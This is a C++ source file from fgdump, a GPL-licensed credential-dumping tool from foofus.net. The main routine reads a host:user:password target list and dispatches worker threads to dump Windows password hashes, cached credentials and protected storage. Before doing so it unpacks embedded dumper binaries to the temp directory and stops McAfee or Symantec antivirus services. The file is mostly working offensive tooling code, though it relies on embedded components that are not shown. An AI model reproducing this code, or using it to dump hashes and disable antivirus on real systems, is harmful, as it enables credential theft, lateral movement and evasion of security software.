/******************************************************************************
fgdump - by fizzgig and the foofus.net group
Copyright (C) 2008 by fizzgig
http://www.foofus.net

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
******************************************************************************/

#include "stdafx.h"
#include "fgdump.h"
#include "resource.h"
#include "ResourceLoader.h"
#include "HostDumper.h"
#include <conio.h>
#include ".\fgdump.h"

#define FAILED_FILE_EXT		".failed"

FGDump::FGDump()
{
	bFullRun = true;
	bRunPwdump = true;
	bRunCachedump = true;
	bRunPStgDump = false;
	bSkipExisting = true;
	bContinueOnUnknownAV = false;
	bUsePerHostCreds = false;
	lpszUser = NULL;
	lpszPassword = NULL;
	lpszServer = NULL;
	lpszSuccessfulServers = NULL;
	lpszFailedServers = NULL;
	nWorkerThreads = 1;	// By default, use a single worker thread
	pThreadData = NULL;
	phWorkerThreadsFinished = NULL;
	nSuccesses = 0, nFailures = 0;
	bDisabledAV = false;
	bSkipPwdumpHistory = false;
	bRunLocal = false;
	bSkipAVCheck = false;
	nOSBits = 0;	// OS 32/64 flag has not been overridden

	memset(lpszSourceFile, 0, MAX_PATH + 1);
	InitializeCriticalSection(&csThreadCreate);
	InitializeCriticalSection(&csReportServerResults);
}

FGDump::~FGDump()
{
	DeleteCriticalSection(&csThreadCreate);
	DeleteCriticalSection(&csReportServerResults);
}

void FGDump::SetSkipPwdumpHistory(bool bSkipHistory)
{
	bSkipPwdumpHistory = bSkipHistory;
}

void FGDump::SetWorkerThreads(unsigned int nThreads)
{
	if (nThreads < 1)
		nThreads = 1;

	nWorkerThreads = nThreads;
}

void FGDump::ExitApp(int nReturnCode)
{
	// Just makes sure that variables are cleaned up
	if (bDisabledAV)
	{
		// Turn it back on
		if (objMcafee.IsServiceInstalled("127.0.0.1"))
		{
			if (objMcafee.GetServiceState("127.0.0.1") == AV_STOPPED)
			{
				objMcafee.StartService("127.0.0.1");
				bDisabledAV = false;
			}
		}
		else if (objSymantec.IsServiceInstalled("127.0.0.1"))
		{
			if (objSymantec.GetServiceState("127.0.0.1") == AV_STOPPED)
			{
				objSymantec.StartService("127.0.0.1");
				bDisabledAV = false;
			}
		}
	}

	if (lpszServer != NULL)
		delete [] lpszServer;
	if (lpszUser != NULL)
		delete [] lpszUser;
	if (lpszPassword != NULL)
		delete [] lpszPassword;

#ifdef _DEBUG
	printf("Press return to exit...");
	scanf("...");
#endif

	exit(nReturnCode);
}

void FGDump::SetTestOnlyAV(bool bTestOnly)
{
	bFullRun = !bTestOnly;
}

void FGDump::SetSkipCacheDump(bool bSkip)
{
	bRunCachedump = !bSkip;
}

void FGDump::SetSkipPWDump(bool bSkip)
{
	bRunPwdump = !bSkip;
}

void FGDump::SetSkipProtectedStorageDump(bool bSkip)
{
	bRunPStgDump = !bSkip;
}

void FGDump::SetIgnoreExistingFiles(bool bIgnoreExisting)
{
	bSkipExisting = bIgnoreExisting;
}

void FGDump::ContinueOnUnknownAV(bool bContinue)
{
	bContinueOnUnknownAV = bContinue;
}

void FGDump::SetHostfileName(char* szFile)
{
	if (strlen(lpszSourceFile) != 0)
	{
		Log.ReportError(CRITICAL, "Source file already specified: did you mistakenly use -f *AND* -H?\n");
		ExitApp(1);
	}
	strncpy(lpszSourceFile, (const char*)szFile, MAX_PATH);
}

void FGDump::SetPerHostFileName(char* szFile)
{
	if (strlen(lpszSourceFile) != 0)
	{
		Log.ReportError(CRITICAL, "Source file already specified: did you mistakenly use -f *AND* -H?\n");
		ExitApp(1);
	}

	bUsePerHostCreds = true;
	strncpy(lpszSourceFile, (const char*)szFile, MAX_PATH);
}


void FGDump::SetServer(char* szServer)
{
	size_t nLen = strlen((const char*)szServer);
	lpszServer = new char[nLen + 1];
	memset(lpszServer, 0, nLen + 1);
	strncpy(lpszServer, szServer, nLen);
}

void FGDump::SetUser(char* szUsername)
{
	size_t nLen = strlen((const char*)szUsername);
	lpszUser = new char[nLen + 1];
	memset(lpszUser, 0, nLen + 1);
	strncpy(lpszUser, szUsername, nLen);
}

void FGDump::SetPassword(char* szPassword)
{
	size_t nLen = strlen((const char*)szPassword);
	lpszPassword = new char[nLen + 1];
	memset(lpszPassword, 0, nLen + 1);
	strncpy(lpszPassword, szPassword, nLen);
}

void FGDump::SetOSArchOverride(int nBits)
{
	nOSBits = nBits;
}

int FGDump::Run()
{
	ResourceLoader objResPWDump, objResPWService, objResLSAExt, objResFGExec;
	ResourceLoader objLSADump, objResCacheDump, objResPStgDump;
	ResourceLoader objResPWService64, objResLSAExt64, objResCacheDump64;
	size_t nLen;
	FILE* fileInput = NULL;
	char szPwdTemp[101];
	char COLON[] = ":";
	char* szSessionID = NULL;
	char* szFailedLogName = NULL;
	char* szDefaultLogName = NULL;

	GetTempPath(MAX_PATH, lpszTempPath);
	//Log.ReportError(DEBUG, "Using a temp path of %s\n", lpszTempPath);

	if (((lpszServer != NULL || *lpszSourceFile != NULL) && lpszUser == NULL) && !bUsePerHostCreds)
	{
		Log.ReportError(CRITICAL, "ERROR: you must specify a server and username!\n");
		ExitApp(1);
	}

	if (lpszServer == NULL && *lpszSourceFile == NULL)
	{
		// Local pwdump run
		bRunLocal = true;
		lpszServer = "127.0.0.1";
	}

	if (lpszSourceFile == NULL && bUsePerHostCreds)
	{
		Log.ReportError(CRITICAL, "ERROR: you must specify a filename to use!\n");
		ExitApp(1);
	}

	if (!bRunLocal && lpszPassword == NULL && !bUsePerHostCreds)
	{
		// Prompt the user for a password
		memset(szPwdTemp, 0, 101);
		printf("Please specify the password to use: ");
		int i = 0;
		char pwBuf[100];
		char c = 0;

		memset(pwBuf, 0, 100);

		while(c != '\r' && i < 100)
		{
			c = _getch();
			pwBuf[i++] = c;
			_putch('*');
		}
		pwBuf[--i] = 0;
		_putch('\r');
		_putch('\n');

		memcpy(szPwdTemp, pwBuf, 100);
		SetPassword(szPwdTemp);
	}

	if ((bRunCachedump == false && bRunPwdump == false) && bFullRun == true)
	{
		Log.ReportError(CRITICAL, "ERROR: You cannot specify -c *and* -w, unless you use -t\n");
		ExitApp(1);
	}

	// Ready to run, grab a session ID
	szSessionID = CreateSessionID();
	if (szSessionID == NULL)
	{
		Log.ReportError(CRITICAL, "ERROR: Could not get a session ID. This is very odd...I'd better quit.\n");
		ExitApp(1);
	}

	size_t nFailedLogNameLength = strlen(szSessionID) + strlen(FAILED_FILE_EXT) + 1;
	szFailedLogName = (char*)malloc(nFailedLogNameLength);
	memset(szFailedLogName, 0, nFailedLogNameLength);
	strncpy(szFailedLogName, szSessionID, strlen(szSessionID));
	strncat(szFailedLogName, FAILED_FILE_EXT, strlen(FAILED_FILE_EXT));

	LogFailed.SetLogFile(szFailedLogName);

	// If we haven't overwritten the log file path, set up the default
	if (strlen(Log.GetLogFile()) == 0)
	{
		size_t nLogNameLength = strlen(szSessionID) + strlen(DEFAULT_LOG_FILE_EXT) + 1;
		szDefaultLogName = (char*)malloc(nLogNameLength);
		memset(szDefaultLogName, 0, nLogNameLength);
		strncpy(szDefaultLogName, szSessionID, strlen(szSessionID));
		strncat(szDefaultLogName, DEFAULT_LOG_FILE_EXT, strlen(DEFAULT_LOG_FILE_EXT));
		Log.SetLogFile(szDefaultLogName);
	}

	Log.SetWriteToFile(true);
	Log.ReportError(REGULAR_OUTPUT, "--- Session ID: %s ---\n", szSessionID);

	// Get the temporary directory for use in unpacking the files
	memset(lpszPWServicePath, 0, MAX_PATH + 15);
    memset(lpszPWDumpPath, 0, MAX_PATH + 15);
    memset(lpszLSAExtPath, 0, MAX_PATH + 15);
	memset(lpszFGExecPath, 0, MAX_PATH + 15);
	memset(lpszCacheDumpPath, 0, MAX_PATH + 15);
	memset(lpszPStoragePath, 0, MAX_PATH + 15);
	memset(lpszPWService64Path, 0, MAX_PATH + 15);
    memset(lpszLSAExt64Path, 0, MAX_PATH + 15);
	memset(lpszCacheDump64Path, 0, MAX_PATH + 15);

	_snprintf(lpszPWServicePath, MAX_PATH + 15, "%s%s", lpszTempPath, "servpw.exe");
	_snprintf(lpszPWDumpPath, MAX_PATH + 15, "%s%s", lpszTempPath, "pwdump.exe");
	_snprintf(lpszLSAExtPath, MAX_PATH + 15, "%s%s", lpszTempPath, "lsremora.dll");
	_snprintf(lpszFGExecPath, MAX_PATH + 15, "%s%s", lpszTempPath, "fgexec.exe");
	_snprintf(lpszCacheDumpPath, MAX_PATH + 15, "%s%s", lpszTempPath, "cachedump.exe");
	_snprintf(lpszPStoragePath, MAX_PATH + 15, "%s%s", lpszTempPath, "pstgdump.exe");
	_snprintf(lpszPWService64Path, MAX_PATH + 15, "%s%s", lpszTempPath, "servpw64.exe");
	_snprintf(lpszLSAExt64Path, MAX_PATH + 15, "%s%s", lpszTempPath, "lsremora64.dll");
	_snprintf(lpszCacheDump64Path, MAX_PATH + 15, "%s%s", lpszTempPath, "cachedump64.exe");

	// If antivirus is running locally, turn it off, since it may disrupt the storage
	// of the worker files locally. Only do this if the user hasn't disabled it.
	if (!bSkipAVCheck)
	{
		if (objMcafee.IsServiceInstalled("127.0.0.1"))
		{
			Log.ReportError(INFO, "McAfee detected locally\n");
			if (objMcafee.GetServiceState("127.0.0.1") == AV_STARTED)
			{
				objMcafee.StopService("127.0.0.1");
				bDisabledAV = true;
			}
		}
		else if (objSymantec.IsServiceInstalled("127.0.0.1"))
		{
			Log.ReportError(INFO, "Symantec detected locally\n");
			if (objSymantec.GetServiceState("127.0.0.1") == AV_STARTED)
			{
				objSymantec.StopService("127.0.0.1");
				bDisabledAV = true;
			}
		}
	}

	if (!objResPWDump.UnpackResource(IDR_PWDUMP, lpszPWDumpPath))
		ExitApp(1);
	if (!objResPWService.UnpackResource(IDR_PWSERVICE, lpszPWServicePath))
		ExitApp(1);
	if (!objResLSAExt.UnpackResource(IDR_LSAEXT, lpszLSAExtPath))
		ExitApp(1);
	if (!objResFGExec.UnpackResource(IDR_FGEXEC, lpszFGExecPath))
		ExitApp(1);
	if (!objResCacheDump.UnpackResource(IDR_CACHEDUMP, lpszCacheDumpPath))
		ExitApp(1);
	if (!objResPStgDump.UnpackResource(IDR_PSTGDUMP, lpszPStoragePath))
		ExitApp(1);
	if (!objResPWService64.UnpackResource(IDR_PWSERVICE64, lpszPWService64Path))
		ExitApp(1);
	if (!objResLSAExt64.UnpackResource(IDR_LSAEXT64, lpszLSAExt64Path))
		ExitApp(1);
	if (!objResCacheDump64.UnpackResource(IDR_CACHEDUMP64, lpszCacheDump64Path))
		ExitApp(1);

	// Set up the thread pool
	CreateThreadPool();

	if (strlen(lpszSourceFile) > 0)
	{
		// User specified a file containing hosts to run against
		char szLine[200];
		size_t nPos;

		fileInput = fopen(lpszSourceFile, "r");
		if (fileInput == NULL)
		{
			Log.ReportError(CRITICAL, "The file %s was not found. Sorry, no potato.\n", lpszSourceFile);
			ExitApp(-1);
		}
		fseek(fileInput, 0, SEEK_SET);

		// Read in data a line at a time and trim it
		while (fgets(szLine, 200, fileInput) != NULL)
		{
			if ((nPos = strcspn(szLine, "\r\n")) >= 0)
			{
				szLine[nPos] = '\0';
			}

			if (strlen(szLine) > 0)
			{
				if (lpszServer != NULL)
					delete [] lpszServer;

				if (bUsePerHostCreds)
				{
					char* szResult;

					if (lpszPassword != NULL)
						delete [] lpszPassword;

					if (lpszUser != NULL)
						delete [] lpszUser;

					// The line has to be broken up by ':' characters as host:user:pwd
					szResult = strtok(szLine, COLON);
					if (szResult == NULL)
					{
						Log.ReportError(CRITICAL, "The line '%s' is not of the correct 'host:user:pwd' format, skipping this entry\n", szLine);
						continue;
					}
		
					// Host name
					nLen = strlen(szResult);
					lpszServer = new char[nLen + 1];
					memset(lpszServer, 0, nLen + 1);
					strncpy(lpszServer, szResult, nLen);

					szResult = strtok(NULL, COLON);
					if (szResult == NULL)
					{
						Log.ReportError(CRITICAL, "The line '%s' is not of the correct 'host:user:pwd' format, skipping this entry\n", szLine);
						continue;
					}
		
					// Username
					nLen = strlen(szResult);
					lpszUser = new char[nLen + 1];
					memset(lpszUser, 0, nLen + 1);
					strncpy(lpszUser, szResult, nLen);

					szResult = strtok(NULL, COLON);
					if (szResult == NULL)
					{
						Log.ReportError(CRITICAL, "The line '%s' is not of the correct 'host:user:pwd' format, skipping this entry\n", szLine);
						continue;
					}
		
					// Password
					nLen = strlen(szResult);
					lpszPassword = new char[nLen + 1];
					memset(lpszPassword, 0, nLen + 1);
					strncpy(lpszPassword, szResult, nLen);
				}
				else
				{
					nLen = strlen(szLine);
					lpszServer = new char[nLen + 1];
					memset(lpszServer, 0, nLen + 1);
					strncpy(lpszServer, szLine, nLen);
				}

				DispatchWorkerThread(lpszServer, lpszUser, lpszPassword);
			}
		}

		// Was there an error or end-of-file?
		if (!feof(fileInput))
		{
			Log.ReportError(CRITICAL, "Unexpected error reading from the file (error %d)\n", GetLastError());
			fclose(fileInput);
			ExitApp(-1);
		}

		fclose(fileInput);
	}
	else
	{
		DispatchWorkerThread(lpszServer, lpszUser, lpszPassword);
	}

	WaitForAllThreadsToFinish();

	Log.ReportError(CRITICAL, "\n-----Summary-----\n\n");
	Log.ReportError(CRITICAL, "Failed servers:\n");
	char* szTemp = arrFailed.GetFirstString();
	if (szTemp == NULL)
		Log.ReportError(CRITICAL, "NONE\n");
	else
	{
		while (szTemp != NULL)
		{
			Log.ReportError(CRITICAL, "%s\n", szTemp);
			szTemp = arrFailed.GetNextString();
		}
	}

	Log.ReportError(CRITICAL, "\nSuccessful servers:\n");
	szTemp = arrSuccess.GetFirstString();
	if (szTemp == NULL)
		Log.ReportError(CRITICAL, "NONE\n");
	else
	{
		while (szTemp != NULL)
		{
			Log.ReportError(CRITICAL, "%s\n", szTemp);
			szTemp = arrSuccess.GetNextString();
		}
	}

	if (pThreadData != NULL)
		delete [] pThreadData;

	if (bDisabledAV)
	{
		// Turn it back on
		if (objMcafee.IsServiceInstalled("127.0.0.1"))
		{
			if (objMcafee.GetServiceState("127.0.0.1") == AV_STOPPED)
			{
				objMcafee.StartService("127.0.0.1");
				bDisabledAV = false;
			}
		}
		else if (objSymantec.IsServiceInstalled("127.0.0.1"))
		{
			if (objSymantec.GetServiceState("127.0.0.1") == AV_STOPPED)
			{
				objSymantec.StartService("127.0.0.1");
				bDisabledAV = false;
			}
		}
	}

	Log.ReportError(CRITICAL, "\nTotal failed: %d\n", nFailures);
	Log.ReportError(CRITICAL, "Total successful: %d\n", nSuccesses);

	if (szSessionID != NULL)
	{
		free(szSessionID);
		szSessionID = NULL;
	}

	if (szFailedLogName != NULL)
	{
		free(szFailedLogName);
		szFailedLogName = NULL;
	}

	if (szDefaultLogName != NULL)
	{
		free(szDefaultLogName);
		szDefaultLogName = NULL;
	}

	return 0;
}

bool FGDump::DispatchWorkerThread(char* lpszServerToDump, char* lpszUser, char* lpszPassword)
{
	// This is controlled by a critical section to prevent race conditions
	EnterCriticalSection(&csThreadCreate);

	size_t nSize;

	WaitForMultipleObjects(nWorkerThreads, phWorkerThreadsFinished, FALSE, INFINITE);	// Wait forever for at least one thread
	for (unsigned int i = 0; i < nWorkerThreads; i++)
	{
		if (WaitForSingleObject(phWorkerThreadsFinished[i], 0) != WAIT_TIMEOUT)
		{
			// It's free - use this thread
			WORKER_THREAD_DATA* pData = &(pThreadData[i]);
			
			// Make sure everyone knows the thread is busy
			ResetEvent(pData->hFinished);

			nSize = strlen(lpszServerToDump);
			pData->lpszServer = (char*)malloc(nSize + 1);
			memset(pData->lpszServer, 0, nSize + 1);
			strncpy(pData->lpszServer, lpszServerToDump, nSize);

			if (lpszUser != NULL)
			{
				nSize = strlen(lpszUser);
				pData->lpszUser = (char*)malloc(nSize + 1);
				memset(pData->lpszUser, 0, nSize + 1);
				strncpy(pData->lpszUser, lpszUser, nSize);
			}
			else
				pData->lpszUser = NULL;

			if (lpszPassword)
			{
				nSize = strlen(lpszPassword);
				pData->lpszPassword = (char*)malloc(nSize + 1);
				memset(pData->lpszPassword, 0, nSize + 1);
				strncpy(pData->lpszPassword, lpszPassword, nSize);
			}
			else
				pData->lpszPassword = NULL;

			// Start the thread
			Log.ReportError(CRITICAL, "Starting dump on %s\n", lpszServer);
			SetEvent(pData->hStartProcessing);

			break;	// Terminate the for loop which is looking for a thread
		}
	}

	LeaveCriticalSection(&csThreadCreate);
	return true;
}

void FGDump::WaitForAllThreadsToFinish()
{
	WaitForMultipleObjects(nWorkerThreads, phWorkerThreadsFinished, TRUE, INFINITE);	// Wait forever for all threads to finish
	
	// Once all the threads are finished, tell them to terminate by sending them a NULL
	// lpszServer parameter, then wait for their finished event
	for (unsigned int i = 0; i < nWorkerThreads; i++)
	{
		WORKER_THREAD_DATA* pData = &(pThreadData[i]);
		
		// Make sure everyone knows the thread is busy
		ResetEvent(pData->hFinished);
		pData->lpszServer = NULL;	// Tells the thread to terminate
		
		// Start the thread
		SetEvent(pData->hStartProcessing);

		// Wait for the thread to finish now
		WaitForSingleObject(phWorkerThreadsFinished[i], INFINITE);
	}
}

DWORD WINAPI FGDump::ThreadProc(LPVOID lpParameter)
{
	WORKER_THREAD_DATA* pData = (WORKER_THREAD_DATA*)lpParameter;

	// Wait for notification to start
	while (1)
	{
		WaitForSingleObject(pData->hStartProcessing, INFINITE);

		// Caller can terminate this thread by setting lpszServer to NULL
		if (pData->lpszServer == NULL)
		{
			Log.ReportError(DEBUG, "Terminating thread %08x (lpszServer is NULL)\n", GetCurrentThreadId());
			break;
		}

		HostDumper objDumper(pData->lpszServer, pData->pParent);
		if (objDumper.DumpServer(pData->lpszUser, pData->lpszPassword) < 1)
		{
			objDumper.FlushOutput();
			Log.ReportError(CRITICAL, "Error dumping server %s, see previous messages for details\n", pData->lpszServer);
			pData->pParent->ReportServerFailure(pData->lpszServer);
		}
		else
		{
			objDumper.FlushOutput();
			pData->pParent->ReportServerSuccess(pData->lpszServer);
		}

		free(pData->lpszServer);
		free(pData->lpszUser);
		free(pData->lpszPassword);

		SetEvent(pData->hFinished);
	}

	//delete pData;
	SetEvent(pData->hFinished);

	return 0;
}

void FGDump::ReportServerSuccess(char* lpszServer)
{
	// These methods must be thread-safe
	EnterCriticalSection(&csReportServerResults);
	nSuccesses++;
	arrSuccess.Add(lpszServer);
	LeaveCriticalSection(&csReportServerResults);
}

void FGDump::ReportServerFailure(char* lpszServer)
{
	// These methods must be thread-safe
	EnterCriticalSection(&csReportServerResults);
	nFailures++;
	arrFailed.Add(lpszServer);
	LeaveCriticalSection(&csReportServerResults);
}

void FGDump::CreateThreadPool(void)
{
	DWORD dwThreadID;

	pThreadData = new WORKER_THREAD_DATA[nWorkerThreads];
	phWorkerThreadsFinished = new HANDLE[nWorkerThreads];

	for (unsigned int i = 0; i < nWorkerThreads; i++)
	{
		WORKER_THREAD_DATA* pData = &(pThreadData[i]);

		pData->pParent = this;
		pData->lpszServer = NULL;
		pData->lpszUser = NULL;
		pData->lpszPassword = NULL;

		pData->hStartProcessing = CreateEvent(NULL, FALSE, FALSE, NULL);
		pData->hFinished = CreateEvent(NULL, TRUE, TRUE, NULL);
		phWorkerThreadsFinished[i] = pData->hFinished;

		CreateThread(NULL, 0, FGDump::ThreadProc, pData, 0, &dwThreadID);
		Log.ReportError(DEBUG, "\n>> A new worker thread has been created with the ID: %08x <<\n", dwThreadID);
	}
}

void FGDump::SetSkipAVCheck(bool bSkipAV)
{
	bSkipAVCheck = true;
}

char* FGDump::CreateSessionID()
{
	// Format for the session ID is: YYYY-MM-DD-HH-mm-SS
	// Will be dynamically allocated, caller should free the memory
	SYSTEMTIME st;
	char* szIDBuffer = NULL;

	GetSystemTime(&st);

	size_t nArgSize = _scprintf("%d-%02d-%02d-%02d-%02d-%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	szIDBuffer = (char*)malloc(nArgSize + 1);
	memset(szIDBuffer, 0, nArgSize + 1);
	_snprintf(szIDBuffer, nArgSize, "%d-%02d-%02d-%02d-%02d-%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

	return szIDBuffer;
}
